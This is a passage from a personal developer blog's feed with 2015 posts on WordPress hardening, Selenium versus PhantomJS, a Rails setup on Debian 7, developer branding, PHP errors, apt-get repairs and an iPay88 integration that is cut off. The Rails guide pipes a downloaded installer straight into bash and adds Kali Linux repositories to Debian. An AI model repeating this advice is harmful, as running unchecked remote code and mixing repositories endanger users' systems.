gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">find</span> <span class="regexp">/path/</span>to<span class="regexp">/your/</span>wordpress<span class="regexp">/install/</span> -type d -exec chmod <span class="number">755</span> &#123;&#125; \;</span><br><span class="line">$ <span class="keyword">find</span> <span class="regexp">/path/</span>to<span class="regexp">/your/</span>wordpress<span class="regexp">/install/</span> -type f -exec chmod <span class="number">644</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure><h3 id="5-Use-Plugins-To-Address-Specific-Security-Issues"><a href="#5-Use-Plugins-To-Address-Specific-Security-Issues" class="headerlink" title="5. Use Plugins To Address Specific Security Issues"></a>5. Use Plugins To Address Specific Security Issues</h3><p>Last but definitely not the least, there is a plugin available online that can help meet your needs, including measures to keep your website protected against attacks. Here are 3 great and highly useful plugins that ensures in making your site</p><ul><li>All In One WP Security And Firewall: This is an excellent plugin that helps monitor a WordPress site for vulnerabilities. That’s not it! The plugin enforces latest security techniques to handle such vulnerabilities. Interestingly enough, it makes use of exceptional “security points grading system” that helps analyze if you’re protecting your site accurately on the basis of security features you’ve activated or not.</li><li>WP Security Audit Log: Wouldn’t it be better if you can stop possible hacker attacks from happening on your WordPress site? This can be achieved with the help of WP Security Audit Log plugin. It helps to store an audit log including the changes and activities that helps improve WordPress productivity and stop hacker attacks. Security log is an extremely useful plugin for professionals and site owners to track changes that takes place on multiple website.</li><li>Google Authenticator: Two step login authentication has proved an effective technique that hardens website security by adding an extra layer of security to it. Using such a technique requires users to enter an authenticated code that they receive on their mobile phone along with a username and password to login into the website’s admin interface. For this purpose, you can make use of the Google Authenticator plugin. It provides an app that enables two-way authentication on Android, or iPhone or Blackberry device.</li></ul><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>So, that’s it! Hope that reading the post will help you find the suitable ways to increase your website security to a great extent. However, make sure to create a backup of your site before making any update and changes to the WordPress core files, as it will help you restore your original website in case it is being hacked and damaged by hackers.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;Author-Bio&quot;&gt;&lt;a href=&quot;#Author-Bio&quot; class=&quot;headerlink&quot; title=&quot;Author Bio :&quot;&gt;&lt;/a&gt;Author Bio :&lt;/h2&gt;&lt;p&gt;Sophia is a renowned WordPress</summary>
        
      
    
    
    
    
    <category term="wordpress" scheme="http://jslim.net/tags/wordpress/"/>
    
    <category term="security" scheme="http://jslim.net/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>Selenium vs PhantomJS - Which One is Better For Testing Web Apps</title>
    <link href="http://jslim.net/blog/2015/10/26/selenium-vs-phantomjs-which-one-is-better-for-testing-web-apps/"/>
    <id>http://jslim.net/blog/2015/10/26/selenium-vs-phantomjs-which-one-is-better-for-testing-web-apps/</id>
    <published>2015-10-26T04:02:46.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p><strong>About the Author</strong> - <em>As an mobile app developer and computer programmer of Xicom Technologies Ltd.-<a href="http://www.xicom.biz/offerings/android-development">Android App Development Services</a>, Amanda Cline explains which is better selenium or phantom JS for testing web apps.  Technology intrigues me and this is why I like to read and write about mobile apps and web development related  topics specially.</em></p><hr/><p>With millions of apps available in the app marketplace, several organizations and individuals are fighting in order to attain maximum app downloads. Many believe that the success of an app depends on its capabilities, usability and the platform for which the app is built. While this is true, but you must also focus on testing the apps. Remember that ignoring to test an app can lead to its failure.</p><p><img src="/images/posts/2015-10-26-selenium-vs-phantomjs-which-one-is-better-for-testing-web-apps/selenium.png" alt="Selenium"></p><p>No matter whether you’re creating a web application for the desktop or a mobile app, be sure that the app is tested thoroughly before releasing it for public use. Doing so, will ensure that your app is bug-free and will let you know about the errors that you need to troubleshoot. Thankfully, there are a few high quality JavaScript testing frameworks that provide convenience and ease to test apps.</p><p>In this post, we’ll be talking about two popular JS frameworks such as Selenium and PhantomJS that helps perform functional tests on web applications. I’ll let you know about the major difference between both these testing frameworks by discussing about their pros and cons, to help you decide which one will best suit your app testing needs. But, let’s first have a brief introduction to Selenium and PhantomJS frameworks.</p><h3 id="Overview-Of-Selenium-and-PhantomJS"><a href="#Overview-Of-Selenium-and-PhantomJS" class="headerlink" title="Overview Of Selenium and PhantomJS"></a>Overview Of Selenium and PhantomJS</h3><p>Selenium serves as an easy-to-use testing framework for web apps. It provides a record/playback tool to carry out the process of authoring tests cases even without the familiarity of test scripting language. This testing framework helps to write tests in different programming languages (like Ruby, C#, Java, etc.) with the help of a domain-specific language (called Selenese). The tests can then be run against most modern web browsers. Selenium helps in running the tests against some of the major web browsers and platforms. This framework can be downloaded for free, since it is an open-source software.</p><p>PhantomJS isn’t exactly a test framework and rather works in sync with a test runner that help in launching tests. Some of the test runners that PhantomJS use for carrying out tests on JavaScript apps are Buster.JS, Mocha, Hiro, Laika and many more. It uses JavaScript API to integrate a test automation system in the browser.</p><h3 id="Selenium-Pros-and-Cons"><a href="#Selenium-Pros-and-Cons" class="headerlink" title="Selenium : Pros and Cons"></a>Selenium : Pros and Cons</h3><p>Let us first  have a look at the pros of the Selenium framework:</p><ul><li>Great Support: Selenium framework has a large community of developers who keep on creating plugins that can make the framework fully-compatible with all modern style JavaScript front-end frameworks</li><li>Detailed Documentation: It provides an extensive yet easy to understand documentation that contains data that can help you learn about the process of testing the apps.</li><li>Allows to Run Multiple Tests: Selenium helps in running multiple tests on different browser windows simultaneously.</li><li>Offers Bindings in Popular Programming Languages: Because of the ability to perform bindings in extensively used programming languages, you can pick any language based on your needs.</li><li>Execute and View Tests in Real-time: Selenium gives the capability of executing feature test in real-time over the web.</li></ul><p>Additionally, it saves the debugging effort by allowing users to see browsers activities in real time.</p><p>Below are some of the cons of the Selenium framework:</p><ul><li>In order to test your app on multiple browsers and operating systems, you will have to configure the tests in a centralized configuration file. </li><li>The Selenium framework does not produce detailed results. </li><li>Running different test cases using the Selenium framework might turn out to be time-consuming. </li><li>Manual testing can be difficult. </li></ul><h3 id="PhantomJS-Pros-and-Cons"><a href="#PhantomJS-Pros-and-Cons" class="headerlink" title="PhantomJS: Pros and Cons"></a>PhantomJS: Pros and Cons</h3><p><img src="/images/posts/2015-10-26-selenium-vs-phantomjs-which-one-is-better-for-testing-web-apps/phantomjs.png" alt="PhantomJS"></p><p>Some of the pros of PhantomJS are listed below:</p><ul><li>Headless Testing: The biggest advantage of PhantomJS framework is that it’s headless, and does not require performing any additional overhaul using the real browser. </li><li>Avoids 3rd Party Integration: It does not requires integration with a third-party service.</li><li>Executes Multiple Tests in Set Time: The framework helps execute multiple test cases in a fixed time period.</li><li>Limits Use of Resources: It makes use of fewer resources for running tests on the web app.</li><li>Smoke Testing: The PhantomJS framework is an ideal choice for performing smoke testing of web applications. </li><li>Manual Testing: PhantomJS makes manual testing a breeze.</li></ul><p>Finally, let’s have a quick glance at disadvantages of PhantomJS:</p><ul><li>Is only compatible with major operating systems such as Linux, Windows, Mac OS X to name a few. </li><li>Since PhantomJS acts as a single version of WebKit, it does not appear a good choice for developers involved in testing web applications. </li><li>Running unit interface tests that require to run on multiple browsers fails to cover all the tests.</li></ul><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>Not focusing on performing unit tests for apps can put you in a lot of trouble, and will require you to spend more time and efforts in maintaining the app. However, you can easily test your web applications in a highly efficient manner using the two most popular Selenium and PhantomJS frameworks. Here, in this post I’ve covered many pros and cons of both these frameworks that will help you make the right decision about choosing a suitable framework to test your web app.</p><h2 id="Credits"><a href="#Credits" class="headerlink" title="Credits:"></a>Credits:</h2><p>Written by: Amanda Cline</p><p><img src="http://mrbool.com/images/columnist/433254_20150601093626.jpg" alt="Amanda Cline"></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;strong&gt;About the Author&lt;/strong&gt; - &lt;em&gt;As an mobile app developer and computer programmer of Xicom Technologies Ltd.-&lt;a</summary>
        
      
    
    
    
    
    <category term="selenium" scheme="http://jslim.net/tags/selenium/"/>
    
    <category term="phantomjs" scheme="http://jslim.net/tags/phantomjs/"/>
    
    <category term="test" scheme="http://jslim.net/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>Setup Ruby on Rails in Debian 7</title>
    <link href="http://jslim.net/blog/2015/10/12/setup-ruby-on-rails-in-debian-7/"/>
    <id>http://jslim.net/blog/2015/10/12/setup-ruby-on-rails-in-debian-7/</id>
    <published>2015-10-12T06:46:27.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Update-the-source-list"><a href="#1-Update-the-source-list" class="headerlink" title="1. Update the source list"></a>1. Update the source list</h2><p>Assumed that ruby &amp; gem are not installed. Need to install <a href="https://rvm.io/">rvm</a> first.</p><p>Before that, rvm require some packages which are not available on the default debian repo. Thus update the <code>apt</code> list first</p><p>Remember to switch to root user</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>su -</span><br></pre></td></tr></table></figure><p>Edit the list file</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vi <span class="regexp">/etc/</span>apt/sources.list</span><br></pre></td></tr></table></figure><p>Make sure all these are inside</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deb http:<span class="regexp">//</span>security.debian.org<span class="regexp">/ wheezy/u</span>pdates main</span><br><span class="line">deb-src http:<span class="regexp">//</span>security.debian.org<span class="regexp">/ wheezy/u</span>pdates main</span><br><span class="line"></span><br><span class="line">deb http:<span class="regexp">//</span>http.kali.org/kali kali main non-free contrib</span><br><span class="line">deb-src http:<span class="regexp">//</span>http.kali.org/kali kali main non-free contrib</span><br></pre></td></tr></table></figure><p>Then run a command <em>(to prevent GPG error)</em></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gpg <span class="comment">--keyserver pgpkeys.mit.edu --recv-key  ED444FF07D8D0BF6</span></span><br><span class="line">$ gpg -<span class="keyword">a</span> <span class="comment">--export ED444FF07D8D0BF6 | sudo apt-key add -</span></span><br></pre></td></tr></table></figure><p>Then update the <code>apt</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-<span class="keyword">get</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><h2 id="2-Install-necessary-programs"><a href="#2-Install-necessary-programs" class="headerlink" title="2. Install necessary programs"></a>2. Install necessary programs</h2><p>First you need <code>curl</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>  apt<span class="literal">-get</span> install <span class="built_in">curl</span></span><br></pre></td></tr></table></figure><h2 id="3-Add-yourself-to-sudoers"><a href="#3-Add-yourself-to-sudoers" class="headerlink" title="3. Add yourself to sudoers"></a>3. Add yourself to sudoers</h2><p>This is because later the rvm script will need sudo</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ adduser username sudo</span><br><span class="line">$ <span class="keyword">exit</span> <span class="regexp">//</span> <span class="keyword">exit</span> from root user</span><br></pre></td></tr></table></figure><h2 id="4-Install-rvm"><a href="#4-Install-rvm" class="headerlink" title="4. Install rvm"></a>4. Install rvm</h2><p>Make sure this is run by yourself <em>(not <strong>root</strong>)</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">\curl -sSL https://get.rvm.io | bash -s stable</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">source</span> ~/.rvm/scripts/rvm</span></span><br></pre></td></tr></table></figure><p>Install latest ruby</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rvm <span class="keyword">install</span> current</span><br></pre></td></tr></table></figure><h2 id="5-Rails-app"><a href="#5-Rails-app" class="headerlink" title="5. Rails app"></a>5. Rails app</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> rails new yourapp</span><br><span class="line"><span class="variable">$</span> <span class="built_in">cd</span> yourapp</span><br></pre></td></tr></table></figure><p>Execute it</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">bin/rails server</span></span><br></pre></td></tr></table></figure><p>Now you can open up your browser, and type in <a href="localhost:3000">localhost:3000</a></p><h2 id="6-Test-by-other-peers-optional"><a href="#6-Test-by-other-peers-optional" class="headerlink" title="6. Test by other peers (optional)"></a>6. Test by other peers (optional)</h2><p>Example if the project is run inside VM <em>(I’m using VMWare Fusion)</em>, then</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">bin/rails </span>server -<span class="keyword">b </span><span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.xx</span><br></pre></td></tr></table></figure><p>Later on, in your host OS’s browser, type in 192.168.1.xx:3000</p><p>References:</p><ul><li><a href="https://github.com/rvm/rvm/issues/2358">Error running ‘requirements_debian_libs_install gawk libyaml-dev libsqlite3-dev autoconf libgdbm-dev libncurses5-dev automake libtool’</a></li><li><a href="http://stackoverflow.com/questions/11111219/accessing-rails-server-from-virtualbox/27576210#27576210">Accessing Rails Server From VirtualBox</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;1-Update-the-source-list&quot;&gt;&lt;a href=&quot;#1-Update-the-source-list&quot; class=&quot;headerlink&quot; title=&quot;1. Update the source list&quot;&gt;&lt;/a&gt;1. Update</summary>
        
      
    
    
    
    
    <category term="debian" scheme="http://jslim.net/tags/debian/"/>
    
    <category term="ruby-on-rails" scheme="http://jslim.net/tags/ruby-on-rails/"/>
    
  </entry>
  
  <entry>
    <title>How branding is important to a developer?</title>
    <link href="http://jslim.net/blog/2015/08/01/how-branding-is-important-to-a-developer/"/>
    <id>http://jslim.net/blog/2015/08/01/how-branding-is-important-to-a-developer/</id>
    <published>2015-08-01T00:53:25.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>When we talk about <strong>“Branding”</strong>, often we thought about sales &amp; marketing.Yes, nothing wrong here! In fact, many developers/geeks doesn’t know that it is important to them too.</p><p>I’m here just to share a little bit of my personal experience.</p><h2 id="My-little-story-begin"><a href="#My-little-story-begin" class="headerlink" title="My little story begin"></a>My little story begin</h2><p>This was started in year 2011, that was my intership program. My supervisor, Mr Ang <em>(drop me an email if you interest to know him)</em> advice me to sign up an <a href="https://github.com/">GitHub</a> account.<br>Yes, I do follow, by that time I didn’t know what is this for. After a couple of months before I leave the company, he then suggest me to create an open source project, at first I have no idea what project I can create, also didn’t know the purpose…</p><h2 id="Blogging"><a href="#Blogging" class="headerlink" title="Blogging"></a>Blogging</h2><p>Until I got my first job as a Cold Fusion programmer, this language was new to me, thus I have a lot to learn. From here, I started to blog in <a href="http://octopress.org/">Octopress</a> platform <em>(I love markdown, also I can use my favourite editor, ViM to write)</em>.<br>My intention was to jot down the learning so that I can refer anytime. But up until this point, I realized that my blog has helps a lot of developers out there to solve their problems.</p><p>2 years+ later, my website just grown up. Refer Alexa rank &amp; Google Analytics below.</p><h3 id="Alexa-rank"><a href="#Alexa-rank" class="headerlink" title="Alexa rank"></a>Alexa rank</h3><p><img src="/images/posts/2015-08-01-how-branding-is-important-to-a-developer/alexa.png" alt="Alexa rank for jslim.net"></p><h3 id="Google-Analytics"><a href="#Google-Analytics" class="headerlink" title="Google Analytics"></a>Google Analytics</h3><p><img src="/images/posts/2015-08-01-how-branding-is-important-to-a-developer/google-analytics.png" alt="Google Analytics for jslim.net"></p><p>In March 2015, I received an email from <a href="https://www.packtpub.com/">Packt publishing</a>, offer me to review a book <a href="http://www.amazon.com/gp/product/1785285025/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=1785285025&linkCode=as2&tag=jssi-20&linkId=RSMIDDEFUPXJ6IPB">Mastering Laravel</a><img src="http://ir-na.amazon-adsystem.com/e/ir?t=jssi-20&l=as2&o=1&a=1785285025" width="1" height="1" border="0" alt="" style="border:none !important; margin:0px !important;" /><br>. I think they get my email from my blog, you can see how a normal software developer can reach to the world.</p><div class="text-center">    <a href="http://www.amazon.com/gp/product/1785285025/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=1785285025&linkCode=as2&tag=jssi-20&linkId=ROMYE4ZWZVJ5LGVK"><img border="0" src="http://ws-na.amazon-adsystem.com/widgets/q?_encoding=UTF8&ASIN=1785285025&Format=_SL110_&ID=AsinImage&MarketPlace=US&ServiceVersion=20070822&WS=1&tag=jssi-20" ></a><img src="http://ir-na.amazon-adsystem.com/e/ir?t=jssi-20&l=as2&o=1&a=1785285025" width="1" height="1" border="0" alt="" style="border:none !important; margin:0px !important;" /></div><h2 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h2><p>Aside from blogging, GitHub also a platform for us as a developer to show case our skills &amp; passion.</p><p>Back in 2013, I had been assigned an in-house project which was to create an iOS app that can decrypt encrypted-QR-code.<br>From here, the first thing I did was to google about the keywords <em>“RSA decryption in iOS”</em>, of course, after few days of searching without getting any solution!</p><p>Some time bad thing can unleash our potention! Because I’m the “most senior” other than boss, I have to find a way to get it works! At the end I think of using C language to decrypt it, since Objective-C can mix with C code.</p><p>After sometime, I modified the messy code and publish in my GitHub account. Until now, it has 40 stars &amp; 21 forks, although it may not be a very great number, but I believe it has already helps many other developers.</p><h2 id="Stackoverflow"><a href="#Stackoverflow" class="headerlink" title="Stackoverflow"></a>Stackoverflow</h2><p>If you’re a developer, I’m 100% sure that you know about this platform. Have you ever post any questions? Have you ever answer any questions?</p><p>There are some users in Stackoverflow I always see their name, which has high reputation as well. Often the questions they post, or the answers they post are very helpful to us.</p><p>If you never post anything here, I suggest you start posting, it helps others, also helps you!</p><h2 id="Write-books"><a href="#Write-books" class="headerlink" title="Write books"></a>Write books</h2><p>I never write any book before. Previously I attended an event about publish books, I’ve learned that write a book can actually build up your name quickly.</p><p>Imagine that you write a book, and publish for free <em>(eBook may be a good choice here)</em>, even though you may not see any tangible profit, but how many people in this world download your book? From here, you’re making tons of intangible profit.</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Of course, there are many more like <strong>give a technical talk</strong>, etc. also helps in building up your name.<br>In current century, we’re talking about portfolio, not a degree certificate, not a fancy resume!</p><p>I highly recommend you to start a blog if you haven’t.</p><p><em>If you’re a most expert programmer in the world, but nobody knows you, then you’re just a nobody.</em></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;When we talk about &lt;strong&gt;“Branding”&lt;/strong&gt;, often we thought about sales &amp;amp; marketing.Yes, nothing wrong here! In fact, many</summary>
        
      
    
    
    
    
    <category term="branding" scheme="http://jslim.net/tags/branding/"/>
    
  </entry>
  
  <entry>
    <title>List of possible PHP errors</title>
    <link href="http://jslim.net/blog/2015/07/28/list-of-possible-php-errors/"/>
    <id>http://jslim.net/blog/2015/07/28/list-of-possible-php-errors/</id>
    <published>2015-07-28T23:51:39.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="What-is-this"><a href="#What-is-this" class="headerlink" title="What is this?"></a>What is this?</h2><p>Many times, we struggled on finding out the cause of error.<br>Especially, it works on local environment, but failed in live server.</p><p>For some hosting, especially shared hosting, we have no freedom to change<br>the php settings and we have to guess which section caused the error<br>and what is it about.</p><p>This usually caused us hours &amp; hours to figure it out.</p><p>Thus, I wrote this post.</p><p>Please comment on below OR drop me an email at <a href="mailto:&#109;&#101;&#64;&#106;&#115;&#x6c;&#x2e;&#105;&#109;">&#109;&#101;&#64;&#106;&#115;&#x6c;&#x2e;&#105;&#109;</a>, if you want to contribute to this post.</p><p>Thanks</p><h2 id="Errors"><a href="#Errors" class="headerlink" title="Errors"></a>Errors</h2><h3 id="1-Can’t-use-method-return-value-in-write-context"><a href="#1-Can’t-use-method-return-value-in-write-context" class="headerlink" title="1. Can’t use method return value in write context"></a>1. Can’t use method return value in write context</h3><p><strong>Failed example</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">method</span>())) &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Correct way</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">method</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Move the result out as a separate variable, even though it may not be use<br>in the section below.</p><p>Reference: <a href="http://stackoverflow.com/questions/1075534/cant-use-method-return-value-in-write-context/1075559#1075559">Can’t use method return value in write context</a></p><h2 id="Contributors"><a href="#Contributors" class="headerlink" title="Contributors"></a>Contributors</h2><ul><li>Js Lim</li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;What-is-this&quot;&gt;&lt;a href=&quot;#What-is-this&quot; class=&quot;headerlink&quot; title=&quot;What is this?&quot;&gt;&lt;/a&gt;What is this?&lt;/h2&gt;&lt;p&gt;Many times, we struggled on</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Debian apt-get not working</title>
    <link href="http://jslim.net/blog/2015/05/05/debian-apt-get-not-working/"/>
    <id>http://jslim.net/blog/2015/05/05/debian-apt-get-not-working/</id>
    <published>2015-05-05T06:47:19.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I’m facing this when I fresh install Debian 7.</p><p>No matter what I trying to install, it doesn’t works.</p><p>Keep showing <strong>E: Unable to locate package …</strong></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@debian:~<span class="comment"># apt-get install git</span></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading <span class="keyword">state</span> information... Done</span><br><span class="line">E: Unable <span class="keyword">to</span> locate package git</span><br><span class="line">root@debian:~<span class="comment"># apt-get upgrade</span></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading <span class="keyword">state</span> information... Done</span><br><span class="line"><span class="number">0</span> upgraded, <span class="number">0</span> newly installed, <span class="number">0</span> <span class="keyword">to</span> remove and <span class="number">0</span> not upgraded.</span><br></pre></td></tr></table></figure><p>Then I found the solution. Edit the source list</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi <span class="regexp">/etc/</span>apt/sources.list</span><br></pre></td></tr></table></figure><p>to this content</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">deb http:<span class="regexp">//</span>ftp.at.debian.org/debian wheezy main contrib</span><br><span class="line"></span><br><span class="line"><span class="comment"># Line commented out by installer because it failed to verify:</span></span><br><span class="line">deb http:<span class="regexp">//</span>security.debian.org<span class="regexp">/ wheezy/u</span>pdates main</span><br><span class="line"><span class="comment"># Line commented out by installer because it failed to verify:</span></span><br><span class="line">deb-src http:<span class="regexp">//</span>security.debian.org<span class="regexp">/ wheezy/u</span>pdates main</span><br></pre></td></tr></table></figure><p>Then run</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># apt<span class="operator">-</span><span class="keyword">get</span> <span class="keyword">update</span></span><br><span class="line"># apt<span class="operator">-</span><span class="keyword">get</span> upgrade</span><br></pre></td></tr></table></figure><p>Now can install other packages</p><p>References:</p><ul><li><em><a href="https://pve.proxmox.com/wiki/Install_Proxmox_VE_on_Debian_Wheezy">Install Proxmox VE on Debian Wheezy</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’m facing this when I fresh install Debian 7.&lt;/p&gt;
&lt;p&gt;No matter what I trying to install, it doesn’t works.&lt;/p&gt;
&lt;p&gt;Keep showing</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="debian" scheme="http://jslim.net/tags/debian/"/>
    
  </entry>
  
  <entry>
    <title>Integrate iPay88 to iOS mobile platform</title>
    <link href="http://jslim.net/blog/2015/03/30/integrate-ipay88-to-ios-mobile-platform/"/>
    <id>http://jslim.net/blog/2015/03/30/integrate-ipay88-to-ios-mobile-platform/</id>
    <published>2015-03-30T21:36:44.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>The first payment gateway I dealed with was PayPal. At that moment,<br>I found it sucks, very tedious to integrate into iOS platform.<br>Until now, I need to work with <a href="http://www.ipay88.com/">iPay88</a>, which<br>has no native iOS SDK, and the process even more tedious than PayPal.<br>I share this because of the toughness &amp; not easy to find any<br>resources on web. Hope you enjoy.</p><h2 id="1-Register-a-merchant-account-with-iPay88"><a href="#1-Register-a-merchant-account-with-iPay88" class="headerlink" title="1. Register a merchant account with iPay88"></a>1. Register a merchant account with iPay88</h2><p>You will get <strong>Merchant Code</strong> and <strong>Merchant Key</strong>.</p><p>After that, submit a <strong>request URL</strong> to iPay88 support. Where the <strong>request<br>URL</strong> is the page that you submit to iPay88 site, you will know later.</p><h2 id="2-Create-a-page-that-support-submit-payment-info-to-iPay88"><a href="#2-Create-a-page-that-support-submit-payment-info-to-iPay88" class="headerlink" title="2. Create a page that support submit payment info to iPay88"></a>2. Create a page that support submit payment info to iPay88</h2><p>Create a page like below <em>(just an example)</em>.</p><p><strong>payment.php</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Payment...<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Processing Payment...<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;https://www.mobile88.com/epayment/entry.asp&quot;</span> <span class="attr">id</span>=<span class="string">&quot;frm-submit&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>If this page does not redirect to payment gateway in seconds, please click RETRY button below<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span>RETRY<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span 